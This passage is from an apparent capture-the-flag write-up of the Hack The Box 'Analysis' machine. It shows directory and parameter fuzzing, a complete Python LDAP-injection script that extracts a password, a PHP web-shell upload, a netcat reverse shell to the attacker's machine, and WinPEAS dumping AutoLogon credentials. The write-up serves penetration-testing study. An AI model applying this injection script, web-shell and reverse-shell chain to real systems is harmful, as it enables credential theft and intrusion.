</span></span></span><span class=line><span class=cl><span class=go>[+] User Agent:              gobuster/3.6
</span></span></span><span class=line><span class=cl><span class=go>[+] Extensions:              php
</span></span></span><span class=line><span class=cl><span class=go>[+] Timeout:                 10s
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>Starting gobuster in directory enumeration mode
</span></span></span><span class=line><span class=cl><span class=go>===============================================================
</span></span></span><span class=line><span class=cl><span class=go>/login.php            (Status: 200) [Size: 1085]
</span></span></span><span class=line><span class=cl><span class=go>/Login.php            (Status: 200) [Size: 1085]
</span></span></span></code></pre></div><ul><li>The site <code>http://internal.analysis.htb/employees/login.php</code> shows a login page:</li></ul><p><img alt="Analysis 2" src=/pentesting/images/Analysis_2.png></p><p>but since we don&rsquo;t have users (at least at the moment), I will save this login panel for later.</p><ul><li>Checking the site site/file <code>/users/list.php</code> with <code>cURL</code> shows that this file accepts parameters:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s http://internal.analysis.htb/users/list.php
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>missing parameter
</span></span></span></code></pre></div><p>However, there are no hints about what is the parameter missing. So we can try to obtain it bruteforcing it.</p><ul><li>I will use <code>ffuf</code> and search for different/potential parameters:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u &#39;http://internal.analysis.htb/users/list.php?FUZZ&#39; -fs 17
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : http://internal.analysis.htb/users/list.php?FUZZ
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 40
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go> :: Filter           : Response size: 17
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>name                    [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 9807ms]
</span></span></span><span class=line><span class=cl><span class=go>:: Progress: [6453/6453] :: Job [1/1] :: 250 req/sec :: Duration: [0:00:26] :: Errors: 0 ::
</span></span></span></code></pre></div><p>where we have found the parameter <code>name</code>. So we have the file with the parameter <code>http://internal.analysis.htb/users/list.php?name</code>. Visiting this site in an internet browser like <code>Firefox</code> shows:</p><p><img alt=Analysis_3.png src=/pentesting/images/Analysis_3.png></p><ul><li><p>I remember that <code>LDAP</code> service was running on this machine. Looking for <a href=https://book.hacktricks.xyz/pentesting-web/ldap-injection class=external-link target=_blank rel=noopener>LDAP Injections at HackTricks</a> we could try with something like <code>name=*</code> to see if it returns something. If I visit <code>http://internal.analysis.htb/users/list.php?name=*</code> to attempt an injection I can see something:
<img alt=Analysis_4.png src=/pentesting/images/Analysis_4.png>
where we have a potential user: <code>technician</code></p></li><li><p>So far we have the following:</p><ol><li>A potential user</li><li>An injectable point with <code>LDAP</code></li></ol><p>So, following steps from <a href=https://book.hacktricks.xyz/pentesting-web/ldap-injection class=external-link target=_blank rel=noopener>HackTricks</a> we can try to inject characters to obtain a password through a <code>Python</code> script. Basically, it checks that the word <code>technician</code> is present in the web request when we start to inject characters to <code>name</code> parameter; if it is present we are going in a good way, if it is not, it is discarded. In this script I have also added a function to check that the password extracted is correct, since some symbols such as <code>&</code>, <code>*</code> or <code>/</code> might cause false negatives/positives even if we urlencode them. For this script we need the library <a href=https://docs.pwntools.com/en/stable/ class=external-link target=_blank rel=noopener>PwnTools</a>. We can install running in our system:</p></li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=gp>$</span> sudo apt-get update
</span></span><span class=line><span class=cl><span class=gp>$</span> sudo apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential
</span></span><span class=line><span class=cl><span class=gp>$</span> python3 -m pip install --upgrade pip
</span></span><span class=line><span class=cl><span class=gp>$</span> python3 -m pip install --upgrade pwntools
</span></span></code></pre></div><p>Once installed we can run the following script to extract the password:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>argparse</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>signal</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>log</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Ctrl+C</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ctrl_c</span><span class=p>(</span><span class=n>sig</span><span class=p>,</span> <span class=n>frame</span><span class=p>)</span><span class=o>-&gt;</span><span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[!] Ctrl+C. Exiting...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sys</span><span class=o>.</span><span class=n>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>signal</span><span class=o>.</span><span class=n>signal</span><span class=p>(</span><span class=n>signal</span><span class=o>.</span><span class=n>SIGINT</span><span class=p>,</span> <span class=n>ctrl_c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>parse_arguments</span><span class=p>()</span><span class=o>-&gt;</span><span class=n>argparse</span><span class=o>.</span><span class=n>Namespace</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># Create the parser</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>(</span><span class=n>description</span><span class=o>=</span><span class=s2>&#34;A simple script for LDAP injection.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># Add arguments</span>
</span></span><span class=line><span class=cl>    <span class=n>parser</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s1>&#39;-u&#39;</span><span class=p>,</span> <span class=s1>&#39;--url&#39;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>str</span><span class=p>,</span> <span class=n>help</span><span class=o>=</span><span class=s1>&#39;URL to attempt LDAP injection (incluiding the injectable parameter). Example: http://internal.analysis.htb/users/list.php?name&#39;</span><span class=p>,</span> <span class=n>required</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>parser</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>request_to_site</span><span class=p>(</span><span class=n>url</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>current_password</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>all_characters</span><span class=p>:</span> <span class=nb>list</span><span class=p>[</span><span class=nb>str</span><span class=p>],</span> <span class=n>p</span><span class=p>)</span><span class=o>-&gt;</span><span class=nb>str</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># Start a loop through different characters to bruteforce the password</span>
</span></span><span class=line><span class=cl>    <span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>index</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>all_characters</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>char</span> <span class=o>=</span> <span class=n>all_characters</span><span class=p>[</span><span class=n>index</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Attempting with char </span><span class=si>{</span><span class=n>char</span><span class=si>!r}</span><span class=s2> (password found, at the moment, </span><span class=si>{</span><span class=n>current_password</span><span class=si>!r}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>req_url</span> <span class=o>=</span> <span class=n>url</span> <span class=o>+</span> <span class=sa>f</span><span class=s1>&#39;=*)(%26(objectClass=user)(description=</span><span class=si>{</span><span class=n>current_password</span><span class=si>}{</span><span class=n>char</span><span class=si>}</span><span class=s1>*)&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>req_url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># Check the condition that satisfies the injection</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=s1>&#39;technician&#39;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>current_password</span> <span class=o>+=</span> <span class=n>char</span>
</span></span><span class=line><span class=cl>            <span class=c1># Restart the list</span>
</span></span><span class=line><span class=cl>            <span class=n>index</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>index</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>current_password</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>check_password_found</span><span class=p>(</span><span class=n>url</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>current_password</span><span class=p>:</span> <span class=nb>str</span><span class=p>,</span> <span class=n>symbols_list</span><span class=p>:</span> <span class=nb>list</span><span class=p>[</span><span class=nb>str</span><span class=p>],</span> <span class=n>all_chars</span><span class=p>:</span> <span class=nb>list</span><span class=p>[</span><span class=nb>str</span><span class=p>])</span><span class=o>-&gt;</span><span class=p>(</span><span class=nb>str</span><span class=p>,</span> <span class=nb>bool</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># Check that the password is not a false positive</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Checking if password (</span><span class=si>{</span><span class=n>current_password</span><span class=si>!r}</span><span class=s2>) has symbols&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>symbol</span> <span class=ow>in</span> <span class=n>symbols_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>temp_password</span><span class=p>:</span> <span class=nb>str</span> <span class=o>=</span> <span class=n>current_password</span> <span class=o>+</span> <span class=n>symbol</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>all_chars</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>p2</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Checking with symbol </span><span class=si>{</span><span class=n>symbol</span><span class=si>!r}</span><span class=s2> and character </span><span class=si>{</span><span class=n>char</span><span class=si>!r}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>req_url</span> <span class=o>=</span> <span class=n>url</span> <span class=o>+</span> <span class=sa>f</span><span class=s1>&#39;=*)(%26(objectClass=user)(description=</span><span class=si>{</span><span class=n>temp_password</span><span class=si>}{</span><span class=n>char</span><span class=si>}</span><span class=s1>*)&#39;</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>req_url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>r</span><span class=o>.</span><span class=n>status_code</span> <span class=o>==</span> <span class=mi>200</span> <span class=ow>and</span> <span class=s1>&#39;technician&#39;</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>p2</span><span class=o>.</span><span class=n>failure</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Password had more symbols (</span><span class=si>{</span><span class=n>symbol</span><span class=si>!r}</span><span class=s2>, so current password is </span><span class=si>{</span><span class=n>current_password</span><span class=o>+</span><span class=n>symbol</span><span class=si>!r}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span> <span class=n>current_password</span><span class=o>+</span><span class=n>symbol</span><span class=p>,</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=n>p2</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=s2>&#34;Password checked. All correct.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>current_password</span><span class=p>,</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ldap_injection</span><span class=p>(</span><span class=n>url</span><span class=p>:</span> <span class=nb>str</span><span class=p>)</span><span class=o>-&gt;</span><span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># LDAP injection</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Attempting LDAP Injection to url </span><span class=si>{</span><span class=n>url</span><span class=si>!r}</span><span class=s2>...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=n>log</span><span class=o>.</span><span class=n>progress</span><span class=p>(</span><span class=s1>&#39;LDAP Injection&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>password</span><span class=p>:</span> <span class=nb>str</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=n>all_characters</span><span class=p>:</span> <span class=nb>list</span><span class=p>[</span><span class=nb>str</span><span class=p>]</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>digits</span><span class=p>)</span> <span class=o>+</span> <span class=nb>list</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_letters</span><span class=p>)</span> <span class=o>+</span> <span class=p>[</span><span class=n>c</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=nb>list</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>punctuation</span><span class=p>)</span> <span class=k>if</span> <span class=n>c</span> <span class=o>!=</span> <span class=s1>&#39;)&#39;</span><span class=p>]</span> <span class=c1># char &#39;)&#39; bugs the data </span>
</span></span><span class=line><span class=cl>    <span class=n>symbols_characters</span><span class=p>:</span> <span class=nb>list</span><span class=p>[</span><span class=nb>str</span><span class=p>]</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=n>string</span><span class=o>.</span><span class=n>punctuation</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>foundPassword</span><span class=p>:</span> <span class=nb>bool</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>    <span class=c1># Exit the loop until we have checked that the extracted password is not a false positive</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=ow>not</span> <span class=n>foundPassword</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># Get the password through injection</span>
</span></span><span class=line><span class=cl>        <span class=n>password</span> <span class=o>=</span> <span class=n>request_to_site</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>password</span><span class=p>,</span> <span class=n>all_characters</span><span class=p>,</span> <span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=c1># Check if the password found is not a false positive </span>
</span></span><span class=line><span class=cl>        <span class=n>password</span><span class=p>,</span> <span class=n>foundPassword</span> <span class=o>=</span> <span class=n>check_password_found</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>password</span><span class=p>,</span> <span class=n>symbols_characters</span><span class=p>,</span> <span class=n>all_characters</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>p</span><span class=o>.</span><span class=n>status</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Password found: </span><span class=si>{</span><span class=n>password</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>()</span><span class=o>-&gt;</span><span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># Get argument from users</span>
</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=n>parse_arguments</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=c1># LDAP injection</span>
</span></span><span class=line><span class=cl>    <span class=n>ldap_injection</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>url</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><ul><li>Running this script we find a password:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ python3 exploit_ldap.py --url &#39;http://internal.analysis.htb/users/list.php?name&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Attempting LDAP Injection to url &#39;http://internal.analysis.htb/users/list.php?name&#39;...
</span></span></span><span class=line><span class=cl><span class=go>[....../.] LDAP Injection: Temporal password is: 97NTtl*4QP96Bv
</span></span></span><span class=line><span class=cl><span class=go>[-] Checking if password has symbols: Password had more symbols (&#39;*&#39;, so current password is &#39;97NTtl*&#39;)
</span></span></span><span class=line><span class=cl><span class=go>[+] Checking if password has symbols: Password checked. All correct.
</span></span></span></code></pre></div><p>so we might have a user and a password: <code>technician:97NTtl*4QP96Bv</code></p><ul><li>We can check that this password works via <code>SMB</code> with <code>NetExec</code>:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.10.11.250 -u &#39;technician&#39; -p &#39;97NTtl*4QP96Bv&#39; --shares
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.10.11.250    445    DC-ANALYSIS      [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC-ANALYSIS) (domain:analysis.htb) (signing:True) (SMBv1:False)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.250    445    DC-ANALYSIS      [+] analysis.htb\technician:97NTtl*4QP96Bv
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.250    445    DC-ANALYSIS      [*] Enumerated shares
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.250    445    DC-ANALYSIS      Share           Permissions     Remark
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.250    445    DC-ANALYSIS      -----           -----------     ------
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.250    445    DC-ANALYSIS      ADMIN$                          Administration √† distance
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.250    445    DC-ANALYSIS      C$                              Partage par d√©faut
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.250    445    DC-ANALYSIS      IPC$            READ            IPC distant
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.250    445    DC-ANALYSIS      NETLOGON        READ            Partage de serveur d&#39;acc√®s
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.10.11.250    445    DC-ANALYSIS      SYSVOL          READ            Partage de serveur d&#39;acc√®s
</span></span></span></code></pre></div><p>but I don&rsquo;t see interesting shares</p><ul><li>After attempting some things, I remember the login panel at <code>http://internal.analysis.htb/employees/login.php</code>. We can try to put these credentials there. They work if we log in as <code>technician@analysis.htb</code></li></ul><p><img alt=Analysis_5.png src=/pentesting/images/Analysis_5.png></p><p>and we are inside the panel:</p><p><img alt="Analysis 6" src=/pentesting/images/Analysis_6.png></p><ul><li>Visiting/clicking <code>SOC Report</code> at the left side I can see that I can upload images. So I upload a simple <code>PHP</code> shell (since, as we have seen, the site works with <code>.php</code> files). I will upload a <a href=https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php class=external-link target=_blank rel=noopener>WWWolf PHP Shell</a> since we are against a <code>Windows</code> system.</li><li>I remember that <code>/dashboard</code> directory had an <code>/uploads</code> directory. My file was called <code>shell.php</code>. Then, I visit <code>http://internal.analysis.htb/dashboard/uploads/shell.php</code> and my shell is there:</li></ul><p><img alt="Analysis 7" src=/pentesting/images/Analysis_7.png></p><p>but I prefer a fully interactive shell. So I start a temporal <code>Python</code> <code>HTTP</code> server on port <code>8080</code> in my machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ls &amp;&amp; python3 -m http.server 8080
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>exploit_ldap.py  nc64.exe  shell.php
</span></span></span><span class=line><span class=cl><span class=go>Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
</span></span></span></code></pre></div><p>and download a <code>netcat</code> binary for <code>Windows</code>, running in the target machine the built-in tool <code>certutil</code>:</p><p><img alt="Analysis 8" src=/pentesting/images/Analysis_8.png></p><ul><li>After downloading it, I start a <code>netcat</code> listener on port <code>443</code> and send me a reverse shell running:</li></ul><p><img alt="Analysis 9" src=/pentesting/images/Analysis_9.png></p><p>and I get a shell as <code>svc_web</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ rlwrap -cAr nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.15] from (UNKNOWN) [10.10.11.250] 51300
</span></span></span><span class=line><span class=cl><span class=go>Microsoft Windows [version 10.0.17763.5329]
</span></span></span><span class=line><span class=cl><span class=go>(c) 2018 Microsoft Corporation. Tous droits rservs.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>C:\inetpub\internal\dashboard\uploads&gt; whoami
</span></span></span><span class=line><span class=cl><span class=go> whoami
</span></span></span><span class=line><span class=cl><span class=go>analysis\svc_web
</span></span></span></code></pre></div><ul><li>I upload <code>WinPEAS</code> to the machine, similar as I did for the <code>netcat</code> binary, and get something interesting:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;.\winpeas.exe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>.\winpeas.exe
</span></span></span><span class=line><span class=cl><span class=go>ANSI color bit for Windows is not set. If you are executing this from a Windows terminal inside the host you should run &#39;REG ADD HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1&#39; and then start a new CMD
</span></span></span><span class=line><span class=cl><span class=go>Long paths are disabled, so the maximum length of a path supported is 260 chars (this may cause false negatives when looking for files). If you are admin, you can enable it with &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v VirtualTerminalLevel /t REG_DWORD /d 1&#39; and then start a new CMD
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Looking for AutoLogon credentials
</span></span></span><span class=line><span class=cl><span class=go>    Some AutoLogon credentials were found
</span></span></span><span class=line><span class=cl><span class=go>    DefaultDomainName             :  analysis.htb.
</span></span></span><span class=line><span class=cl><span class=go>    DefaultUserName               :  jdoe
</span></span></span><span class=line><span class=cl><span class=go>    DefaultPassword               :  7y4Z4^*y9Zzj
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>so we have a user and a password: <code>jdoe:7y4Z4^*y9Zzj</code></p><ul><li>And also checking this user shows:</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>C:\Users\Public\Downloads&gt;net user jdoe
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>net user jdoe
</span></span></span><span class=line><span class=cl><span class=go>Nom d&#39;utilisateur                              jdoe
</span></span></span><span class=line><span class=cl><span class=go>Nom complet                                    john doe
</span></span></span><span class=line><span class=cl><span class=go>Commentaire
</span></span></span><span class=line><span class=cl><span class=go>Commentaires utilisateur
</span></span></span><span class=line><span class=cl><span class=go>Code du pays ou de la rgion                   000 (Valeur par dfaut du systme)
</span></span></span><span class=line><span class=cl><span class=go>Compte: actif                                 Oui
</span></span></span><span class=line><span class=cl><span class=go>Le compte expire                               Jamais
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mot de passe: dernier changmt.                04/01/2024 11:37:29
</span></span></span><span class=line><span class=cl><span class=go>Le mot de passe expire                         Jamais
</span></span></span><span class=line><span class=cl><span class=go>Le mot de passe modifiable                     05/01/2024 11:37:29
</span></span></span><span class=line><span class=cl><span class=go>Mot de passe exig                             Oui
</span></span></span><span class=line><span class=cl><span class=go>L&#39;utilisateur peut changer de mot de passe     Oui
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Stations autorises                            Tout
</span></span></span><span class=line><span class=cl><span class=go>Script d&#39;ouverture de session
</span></span></span><span class=line><span class=cl><span class=go>Profil d&#39;utilisateur
</span></span></span><span class=line><span class=cl><span class=go>Rpertoire de base
</span></span></span><span class=line><span class=cl><span class=go>Dernier accs                                  19/05/2024 01:43:25
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Heures d&#39;accs autoris                        Tout
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Appartient aux groupes locaux                  *Utilisateurs de gesti
</span></span></span><span class=line><span class=cl><span class=go>Appartient aux groupes globaux                 *Utilisateurs du domai
</span></span></span><span class=line><span class=cl><span class=go>La commande s&#39;est termine correctement.
